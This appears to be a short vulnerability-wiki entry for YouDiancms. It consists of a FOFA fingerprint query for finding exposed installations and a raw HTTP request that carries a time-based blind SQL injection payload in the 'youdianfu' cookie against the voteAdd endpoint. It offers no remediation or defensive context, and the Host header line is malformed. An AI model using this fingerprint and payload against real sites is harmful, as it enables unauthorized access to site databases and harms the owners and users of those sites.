<languages />

FOFA
----

    icon_hash="1728964041"

<translate>

漏洞影響
--------

</translate> YouDiancms

Payload
-------

    GET /index.php/Channel/voteAdd HTTP/1.1
    Host: localhostContent-Length: 2
    Accept: application/json, text/javascript, */*; q=0.01
    X-Requested-With: XMLHttpRequest
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: youdianfu[0]=exp;youdianfu[1]==(select 1 from(select sleep(3))a)
    Connection: close